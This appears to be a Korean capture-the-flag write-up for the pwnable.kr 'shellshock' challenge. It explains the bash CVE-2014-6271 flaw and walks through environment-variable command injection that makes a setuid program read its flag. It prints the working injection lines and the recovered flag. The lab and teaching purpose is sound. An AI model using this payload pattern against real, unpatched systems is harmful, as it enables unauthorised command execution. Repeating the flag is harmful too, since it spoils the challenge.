# [Toddler's Bottle] shellshock
shellshock에서 제공하는 글을 확인해보자.
```
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```
putty로 접속 해주자.

글에서 `shocking news about bash`라고 했으므로 Bash 취약점(CVE-2014-6271)에 대해 알아보자.

bash 취약점은  
`env x='() { :;}; echo vulnerable' bash -c "echo test"`를 실행해줌으로써 확인 할 수 있는 취약점인데

환경변수 설정을 하는 env 를 통해 환경변수 x = (함수명) {수행코드}; 라고 환경변수를 등록하는 ; 까지는 정상적인 동작이나,  
그 이후에 삽입되어 있는 echo vulnerable' bash -c "echo test" 명령어는 무시되거나 오류를 발생해야 하지만  
실제로는 수행이되어 다음과같이 test를 출력하는 것을 알 수 있습니다.
```
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' bash -c "echo test"
env x='() { :;}; echo vulnerable' bash -c "echo test"
test
```
따라서 다음과 같이 환경변수를 만들어주고 `./bash`를 실행시켜보면
```
shellshock@ubuntu:~$ export hello='() { pwd; };pwd;id'
shellshock@ubuntu:~$ ./bash
/home/shellshock
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
shellshock@ubuntu:~$ export hello='() { pwd; };pwd;id'
shellshock@ubuntu:~$ ./bash
/home/shellshock
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
```
; 뒤에 명령어들이 실행되게 된다.

`shellshock.c`를 살펴보면
```
shellshock@ubuntu:~$ cat shellshock.c
cat shellshock.c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}

```
bash 자체의 취약점을 이용해서 업그레이드된 gid로 cat flag를 해준다면 flag를 읽을 수 있을 것이다.
```
shellshock@ubuntu:~$ export cat='() { pwd; }; /bin/cat flag'
shellshock@ubuntu:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$
```
